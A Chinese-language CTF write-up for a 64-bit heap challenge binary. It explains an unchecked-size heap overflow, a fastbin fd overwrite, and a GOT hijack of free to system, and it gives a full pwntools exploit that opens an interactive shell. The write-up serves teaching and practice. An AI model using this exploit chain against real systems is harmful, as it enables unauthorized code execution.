# 漏洞利用文档

## 执行环境
基于提供的反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，使用GLIBC
- **保护机制**（推断自exp和代码）：
  - **CANARY**：启用（反编译代码中可见`__readfsqword(0x28u)`栈保护）
  - **PIE**：禁用（exp中使用固定地址如`0x6020ad`，表明代码段和数据段地址固定）
  - **NX**：可能启用（堆利用未涉及代码执行，但通过GOT劫持实现）
  - **RELRO**：部分（GOT表可写，exp成功覆盖free@got）
- **依赖库**：标准C库（libc），通过`elf.libc`加载
- **运行需求**：Linux环境，需要`/home/pwn/flag`文件存在（l33t函数中硬编码）

## 漏洞成因
### 关键结构体分析
- **heaparray**：全局指针数组（地址`0x6020e0`），存储10个堆块用户数据指针，索引0-9
- **堆块结构**：每个堆块包含元数据（size等）和用户数据区
- **magic变量**：全局变量（地址`0x6020c0`），需值>0x1305才能触发l33t函数

### 漏洞分析
- **漏洞类型**：堆溢出（Heap Overflow）
- **成因**：在`edit_heap`函数中，用户可控制输入大小（v2），但未验证是否超过原始分配大小：
  ```c
  printf("Size of Heap : ");
  read(0, buf, 8u);
  v2 = atoi(buf);
  read_input(*(&heaparray + v1), v2); // 可写入超过原始大小的数据
  ```
- **影响**：通过编辑堆块时指定更大size，可溢出覆盖相邻堆块的元数据（如size和fd指针），导致内存破坏

## 漏洞利用过程
结合exp步进调试，堆内存变化如下表：

| 步骤 | 操作 | 堆状态变化 | 全局变量变化 | 关键内存地址 |
|------|------|------------|--------------|-------------|
| 1 | `add(0x68,b'6')` x3 | 分配3个堆块：chunk0(0x34496010)、chunk1(0x34496080)、chunk2(0x344960f0)，大小均为0x71 | heaparray[0-2]指向各堆块用户数据区 | magic=0x0 |
| 2 | `free(2)` | 释放chunk2，进入fastbin 0x70链：chunk2 → NULL | heaparray[2]=0x0 | fastbin[0x70]=chunk2 |
| 3 | `edit(1, payload)` | 堆溢出：chunk1写入"/bin/sh" + 填充 + 伪造size(0x71) + fd(0x6020ad)，覆盖chunk2元数据 | 无变化 | fastbin[0x70]：chunk2 → 0x6020ad |
| 4 | `add(0x68,b'6')` x2 | 分配：第一次取回chunk2，第二次从伪造地址0x6020ad分配chunk3 | heaparray[2]=0x344960f0, heaparray[3]=0x6020bd | fastbin空 |
| 5 | `edit(3, payload)` | 写入chunk3：偏移0x23处覆盖为free@got地址(0x602018) | heaparray[0]被间接修改为0x602018（GOT地址） | free@got未变 |
| 6 | `edit(0, p64(system))` | 通过heaparray[0]（现指向GOT）覆盖free@got为system@plt | 无直接变化 | free@got=0x400700 (system@plt) |
| 7 | `free(1)` | 触发system("/bin/sh")（因free被劫持） | 无变化 | 进程执行/bin/sh |
| 8 | `ia()` | 获得shell交互 | 无变化 | 权限提升 |

### 内存布局演变
- **初始**：堆连续分配，各chunk间隔0x70字节
- **溢出后**：chunk1数据溢出到chunk2，修改其fd指针指向数据段
- **利用后**：GOT表被修改，heaparray[0]指向GOT，heaparray[1]包含"/bin/sh"

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample17')
elf = ELF('./data/sample17')
libc = elf.libc

# 工具函数定义
n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda n    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

# 堆操作封装
def add(size,content):
    sla(':','1')
    sla(':',str(size))
    sla(':',content)

def edit(idx, content):
    sla(':','2')
    sla(':',str(idx))
    sla(':',str(len(content)))  # 关键：可控制大小，导致堆溢出
    sla(':',content)

def free(idx):
    sla(':','3')
    sla(':',str(idx))

# 步骤1: 堆布局，创建3个0x68大小堆块
add(0x68,b'6');add(0x68,b'6');add(0x68,b'6')  # 分配连续堆块，便于溢出

# 步骤2: 释放索引2堆块，进入fastbin
free(2)  # chunk2进入fastbin 0x70链

# 步骤3: 堆溢出攻击，覆盖chunk2的fd指针
edit(1, b'/bin/sh\x00' + b'\x00'*0x60 + p64(0x71) + p64(0x6020ad))  
# 溢出chunk1，写入/bin/sh字符串，伪造chunk2的size(0x71)和fd指针(0x6020ad)

# 步骤4: 分配伪造堆块
add(0x68,b'6');add(0x68,b'6')  # 第二次分配从伪造地址0x6020ad获取chunk3

# 步骤5: 通过伪造堆块写入GOT地址
edit(3, b'\x00'*0x23 + p64(elf.got['free']))  
# 在chunk3偏移0x23处写入free@got地址，使heaparray[0]指向GOT

# 步骤6: 覆盖free@got为system@plt
edit(0, p64(elf.plt['system']))  
# 通过heaparray[0]（现指向GOT）覆盖free@got为system@plt

# 步骤7: 触发system("/bin/sh")
free(1)  # 实际执行system("/bin/sh")，因为free被劫持且chunk1包含"/bin/sh"

# 步骤8: 交互获得shell
ia()
```

### 关键注释说明
- **堆溢出点**：`edit`函数中用户可控的size参数，允许写入超过原始分配大小。
- **fastbin攻击**：通过溢出修改释放堆块的fd指针，实现任意地址分配。
- **GOT劫持**：利用任意地址写能力覆盖free@got为system@plt，将内存破坏转化为代码执行。
- **触发利用**：释放包含"/bin/sh"的堆块，触发system调用，获得shell权限。

此利用链成功结合堆溢出、fastbin attack和GOT hijacking，最终实现权限提升。
